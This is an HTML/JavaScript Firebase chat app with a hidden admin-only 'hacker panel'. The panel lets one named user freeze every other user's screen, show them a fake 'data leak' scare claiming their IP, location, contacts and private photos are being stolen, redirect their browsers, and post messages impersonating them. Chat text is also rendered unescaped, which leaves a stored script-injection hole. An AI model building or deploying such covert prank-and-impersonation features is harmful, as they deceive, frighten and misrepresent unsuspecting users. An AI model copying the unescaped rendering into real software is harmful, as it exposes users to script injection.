<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --bg: #0b0f19; --neon: #00ff41; --danger: #ff3e3e; --glass: rgba(17, 25, 40, 0.9); --border: rgba(255, 255, 255, 0.1); }
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: #e6edf3; overflow: hidden; }
        .app { max-width: 500px; margin: auto; height: 100vh; position: relative; display: flex; flex-direction: column; }
        
        header { padding: 15px; background: var(--glass); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); }
        header h1 { margin: 0; font-size: 1.2rem; background: linear-gradient(90deg, #58a6ff, #bc8cff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .page { display: none; padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 180px; }
        .active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Shareef UI for others */
        .card { background: var(--glass); border: 1px solid var(--border); padding: 15px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .msg { margin-bottom: 12px; padding: 10px 15px; border-radius: 15px; max-width: 80%; position: relative; font-size: 14px; }
        .msg.me { align-self: flex-end; background: #238636; color: white; border-bottom-right-radius: 2px; }
        .msg.other { align-self: flex-start; background: #21262d; border-bottom-left-radius: 2px; }
        .msg b { font-size: 11px; color: #8b949e; display: block; margin-bottom: 3px; }

        /* Hacker Panel - Only for Nazim */
        #hacker-panel { display: none; background: #000; border: 1px solid var(--danger); padding: 10px; margin: 10px; border-radius: 8px; flex-wrap: wrap; gap: 5px; box-shadow: 0 0 10px var(--danger); }
        .hack-btn { flex: 1; min-width: 80px; padding: 8px; font-size: 10px; background: transparent; border: 1px solid var(--danger); color: var(--danger); cursor: pointer; text-transform: uppercase; }
        .hack-btn:hover { background: var(--danger); color: white; }

        .input-area { position: absolute; bottom: 80px; width: 100%; padding: 15px; box-sizing: border-box; background: var(--bg); }
        .chat-input { width: 100%; background: #161b22; border: 1px solid var(--border); color: white; padding: 12px; border-radius: 25px; outline: none; }

        /* Scaring Overlays */
        #scare-ui { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color:var(--neon); flex-direction:column; align-items:center; justify-content:center; text-align:left; font-family: 'Courier New', monospace; padding: 20px; box-sizing: border-box; }
        .matrix-text { font-size: 12px; line-height: 1.5; color: var(--neon); }
    </style>
</head>
<body>

<div id="scare-ui">
    <div class="matrix-text" id="matrix-content"></div>
</div>

<div class="app">
    <header>
        <h1>Live Connect</h1>
        <i class="fa-solid fa-shield-halved" style="color:#58a6ff"></i>
    </header>

    <div id="loginPage" class="page active">
        <div style="text-align: center; margin-top: 50px;">
            <img src="https://cdn-icons-png.flaticon.com/512/2584/2584687.png" width="80" style="filter: hue-rotate(180deg);">
            <h3>Login to Connect</h3>
            <input type="text" id="usernameInput" class="chat-input" placeholder="Your Name" style="text-align:center">
            <button onclick="login()" style="width:100%; padding:15px; margin-top:20px; background:#238636; color:white; border:none; border-radius:25px; font-weight:bold; cursor:pointer">LOGIN</button>
        </div>
    </div>

    <div id="home" class="page">
        <div class="card" onclick="startGlobal()">
            <div><b>Global Community</b><br><small>Chat with everyone</small></div>
            <i class="fa-solid fa-chevron-right"></i>
        </div>
        <p style="color:#8b949e; font-size: 12px; margin-top: 20px;">Active Connections:</p>
        <div id="userList"></div>
    </div>

    <div id="chat" class="page">
        <div id="hacker-panel">
            <button class="hack-btn" onclick="executeHack('freeze')">Freeze All</button>
            <button class="hack-btn" onclick="executeHack('scare')">Fake Leak</button>
            <button class="hack-btn" onclick="executeHack('hijack')">Redirect</button>
            <button class="hack-btn" onclick="executeHack('unfreeze')" style="color:var(--neon); border-color:var(--neon)">Restore</button>
        </div>
        <div id="chatBox" style="display:flex; flex-direction:column;"></div>
        <div class="input-area">
            <input type="text" id="msgInput" class="chat-input" placeholder="Type a message...">
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE",
    authDomain: "live-chat-b810c.firebaseapp.com",
    databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com",
    projectId: "live-chat-b810c"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentUser = null, curChat = "global";
const adminName = "Nazim"; 

window.login = () => {
    const val = document.getElementById("usernameInput").value.trim();
    if(!val) return;
    currentUser = val;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("home").classList.add("active");
    
    if(currentUser === adminName) document.getElementById("hacker-panel").style.display="flex";

    onValue(ref(db, "powers/" + currentUser), snap => {
        const p = snap.val();
        if(p === "freeze") { document.getElementById("scare-ui").style.display="flex"; document.getElementById("matrix-content").innerHTML = "<h1>SYSTEM LOCKED</h1><p>Contact admin to unlock...</p>"; }
        if(p === "scare") { 
            document.getElementById("scare-ui").style.display="flex"; 
            fakeLeakEffect();
        }
        if(p === "unfreeze") { document.getElementById("scare-ui").style.display="none"; }
        if(p === "hijack") window.location.href = "https://www.google.com";
    });

    set(ref(db, "users/" + currentUser), { name: currentUser, online: true });
    syncUsers();
};

function fakeLeakEffect() {
    let i = 0;
    const content = [
        "> CONNECTING TO LOCALHOST:8080...",
        "> BYPASSING FIREWALL...",
        "> ACCESSING DEVICE STORAGE...",
        "> EXTRACTING IP: 192.168.1.104",
        "> LOCATION: RAWALPINDI, PK",
        "> EXTRACTING CONTACTS...",
        "> UPLOADING PRIVATE PHOTOS...",
        "> DATABASE LEAKED SUCCESSFULLY!"
    ];
    const el = document.getElementById("matrix-content");
    el.innerHTML = "";
    let interval = setInterval(() => {
        el.innerHTML += content[i] + "<br>";
        i++;
        if(i >= content.length) clearInterval(interval);
    }, 800);
}

window.startGlobal = () => { curChat = "global"; openPage('chat'); loadChat(); };

window.sendMsg = () => {
    const inp = document.getElementById("msgInput");
    const val = inp.value.trim();
    if(!val) return;

    if(currentUser === adminName && val.startsWith("/as ")) {
        const parts = val.split(" ");
        const victim = parts[1];
        const msg = val.replace("/as "+victim+" ", "");
        push(ref(db, "messages/global"), { from: victim, text: msg });
        inp.value = ""; return;
    }

    push(ref(db, "messages/global"), { from: currentUser, text: val });
    inp.value = "";
};

document.getElementById("msgInput").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendMsg(); });

function loadChat() {
    onValue(ref(db, "messages/global"), snap => {
        const box = document.getElementById("chatBox"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `msg ${d.from === currentUser ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.from}</b>${d.text} 
            ${(currentUser === adminName) ? `<i class="fa-solid fa-trash" style="font-size:10px; color:red; margin-left:10px; cursor:pointer" onclick="remove(ref(db,'messages/global/${m.key}'))"></i>` : ''}`;
            box.appendChild(div);
        });
        box.scrollTop = box.scrollHeight;
    });
}

function syncUsers() {
    onValue(ref(db, "users"), snap => {
        const list = document.getElementById("userList"); list.innerHTML = "";
        snap.forEach(u => {
            if(u.key !== currentUser) {
                let d = document.createElement("div"); d.className = "card";
                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-circle" style="color:#2ea043; font-size:8px"></i>`;
                list.appendChild(d);
            }
        });
    });
}

window.executeHack = (act) => {
    onValue(ref(db, "users"), snap => {
        snap.forEach(u => { if(u.key !== adminName) set(ref(db, "powers/" + u.key), act); });
    }, {onlyOnce: true});
};

window.openPage = (id) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
};
</script>
</body>
</html>
